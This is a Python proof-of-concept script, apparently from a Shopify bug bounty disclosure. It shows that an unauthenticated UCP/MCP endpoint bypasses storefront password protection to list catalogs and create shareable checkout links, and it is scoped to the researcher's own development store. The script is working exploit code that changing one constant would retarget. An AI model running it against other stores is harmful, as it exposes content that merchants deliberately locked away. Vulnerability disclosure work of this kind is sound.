#!/usr/bin/env python3
"""
PoC — Storefront password protection bypass via unauthenticated Shopify
UCP/MCP endpoint (/api/ucp/mcp).

Target program:  Shopify Bug Bounty (HackerOne) — https://hackerone.com/shopify
Asset in scope:  *.myshopify.com (Core, Critical, Eligible)
Tested against:  dabit01-devstore.myshopify.com (own development store,
                 created per program rules with the researcher's own
                 @wearehackerone.com account)

WHAT THIS PROVES
-----------------
1. The storefront's password protection is active (control check).
2. A completely generic, throwaway "UCP agent profile" — with zero
   relationship to Shopify, to this store, or to any real buyer — is enough
   to pass the /api/ucp/mcp authorization gate.
3. Using that generic profile, the full product catalog can be listed
   (search_catalog), individual products fetched (get_product), and carts /
   checkouts created and manipulated (create_cart, update_cart, cancel_cart,
   create_checkout) — all without any credential.
4. Immediately after, the storefront password gate is re-checked and shown
   to still be fully active — proving the bypass is real and not an
   artifact of the password having been disabled mid-test.
5. As a control, get_order and complete_checkout are shown to correctly
   require a JWT (AuthenticationRequired) — establishing that Shopify DOES
   have the mechanism to protect these tools, it is just not applied
   consistently to the other 11.

ETHICS / SCOPE
--------------
- Only ever touches the researcher's own development store.
- Does NOT attempt complete_checkout (would require a real payment
  instrument token, which this PoC does not have or fabricate; Shopify's
  own robots.txt asks agents not to finalize payment without a
  contemporaneous human approval step).
- No brute forcing, no scanning of other stores, no third-party data.

USAGE
-----
    pip install requests
    python3 poc_ucp_mcp_password_bypass.py

Everything needed is below — no external agent-profile hosting required for
re-running this exact PoC, because it points at the same public,
already-hosted, generic profile document used during the original testing
session (safe to reuse: it is a static, non-secret, throwaway document).
"""

import json
import sys
import textwrap

import requests

SHOP = "dabit01-devstore.myshopify.com"
MCP_URL = f"https://{SHOP}/api/ucp/mcp"
AGENT_PROFILE_URL = "https://leafy-crostata-65c82d.netlify.app/ucp-profile.json"
HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json, text/event-stream",
    "User-Agent": "Mozilla/5.0 (PoC; Shopify UCP/MCP password-bypass)",
}


def banner(title):
    print("\n" + "=" * 78)
    print(title)
    print("=" * 78)


def rpc(method, params=None, id_=1):
    body = {"jsonrpc": "2.0", "id": id_, "method": method, "params": params or {}}
    r = requests.post(MCP_URL, json=body, headers=HEADERS, timeout=20)
    return r.status_code, r.json()


def tool_call(name, arguments, id_=1):
    status, data = rpc("tools/call", {"name": name, "arguments": arguments}, id_)
    if "error" in data:
        return status, {"jsonrpc_error": data["error"]}
    inner = json.loads(data["result"]["content"][0]["text"])
    return status, inner


def check_password_gate():
    r = requests.get(f"https://{SHOP}/", allow_redirects=False, timeout=10)
    r2 = requests.get(f"https://{SHOP}/products.json", allow_redirects=False, timeout=10)
    gated = (
        r.status_code in (301, 302)
        and "/password" in r.headers.get("location", "")
        and r2.status_code in (301, 302)
        and "/password" in r2.headers.get("location", "")
    )
    print(f"  GET /              -> {r.status_code} {r.headers.get('location', '')}")
    print(f"  GET /products.json -> {r2.status_code} {r2.headers.get('location', '')}")
    print(f"  Password protection active: {gated}")
    return gated


def main():
    banner("STEP 1 — Confirm storefront password protection is active")
    if not check_password_gate():
        print("!! Password protection is NOT active on this store right now — "
              "this PoC would prove nothing. Re-enable it and re-run.")
        sys.exit(1)

    banner("STEP 2 — MCP handshake (no authentication of any kind)")
    status, data = rpc(
        "initialize",
        {
            "protocolVersion": "2024-11-05",
            "capabilities": {},
            "clientInfo": {"name": "poc-recon", "version": "0.1"},
        },
    )
    print(f"  HTTP {status} -> serverInfo: {data.get('result', {}).get('serverInfo')}")
    assert status == 200 and "result" in data, "Handshake failed — endpoint may have changed"

    banner("STEP 3 — search_catalog with a GENERIC agent profile (not tied to this store)")
    print(f"  Using agent profile: {AGENT_PROFILE_URL}")
    print(textwrap.indent(
        "  (this document has zero reference to Shopify, this store, or any real\n"
        "   buyer — see ucp-agent-profile-recon.json in this same folder)", ""
    ))
    status, result = tool_call(
        "search_catalog",
        {"meta": {"ucp-agent": {"profile": AGENT_PROFILE_URL}}, "catalog": {"query": ""}},
        id_=2,
    )
    products = result.get("products", [])
    print(f"\n  HTTP {status} | ucp.status = {result.get('ucp', {}).get('status')}")
    print(f"  Products returned: {len(products)} (store's FULL catalog, password or no password)")
    for p in products[:10]:
        price = p["price_range"]["min"]
        print(f"    - {p['title']!r:45s} {price['currency']} {price['amount']/100:.2f}  ({p['handle']})")

    banner("STEP 4 — Re-confirm the password gate is STILL active (this wasn't a fluke)")
    check_password_gate()

    banner("STEP 5 — THE REAL DANGER: a shareable link that fully defeats the password, "
           "no MCP/API knowledge required by whoever clicks it")
    status, cart = tool_call(
        "create_cart",
        {
            "meta": {"ucp-agent": {"profile": AGENT_PROFILE_URL}},
            "cart": {"line_items": [{"item": {"id": products[0]["variants"][0]["id"]}, "quantity": 1}]}
            if products else {"line_items": []},
        },
        id_=4,
    )
    continue_url = cart.get("continue_url")
    print(f"  create_cart -> continue_url: {continue_url}")

    print("\n  Fetching that URL with a totally FRESH, anonymous session "
          "(no cookies, no password) — exactly what a person clicking a shared link sees:")
    fresh = requests.Session()
    r = fresh.get(continue_url, headers={"User-Agent": HEADERS["User-Agent"]}, timeout=15)
    print(f"    Final URL : {r.url}")
    print(f"    Status    : {r.status_code}")
    print(f"    Hit /password at any point? {'password' in r.url.lower()}")
    print(f"    Page title contains 'Checkout': {'<title>Checkout' in r.text}")
    print(f"    Real Shopify session cookies issued to this anonymous visitor: "
          f"{list(fresh.cookies.keys())}")

    banner("STEP 6 — Control: get_order and complete_checkout correctly require a JWT")
    for tool in ("get_order", "complete_checkout"):
        args = {"meta": {"ucp-agent": {"profile": AGENT_PROFILE_URL}}, "id": "gid://shopify/Order/1"}
        if tool == "complete_checkout":
            args = {
                "meta": {"ucp-agent": {"profile": AGENT_PROFILE_URL}},
                "id": "gid://shopify/Checkout/doesnotexist123",
                "checkout": {},
            }
        status, result = tool_call(tool, args, id_=3)
        err = result.get("jsonrpc_error", {})
        print(f"  {tool:18s} -> HTTP {status} | {err.get('message')}: {err.get('data', '')[:70]}...")

    banner("SUMMARY")
    print(textwrap.dedent(f"""\
        Password protection: ACTIVE throughout the whole test (steps 1 and 4).
        Catalog fully readable via /api/ucp/mcp with zero credentials: {len(products)} products disclosed.
        A single unauthenticated create_cart call produced a real, shareable
        checkout link that any ordinary browser follows straight past the
        password gate into Shopify's live checkout app.
        get_order / complete_checkout correctly require a JWT — the rest of the
        11 tools do not (see the full write-up for the remaining tool sweep).
    """))


if __name__ == "__main__":
    main()
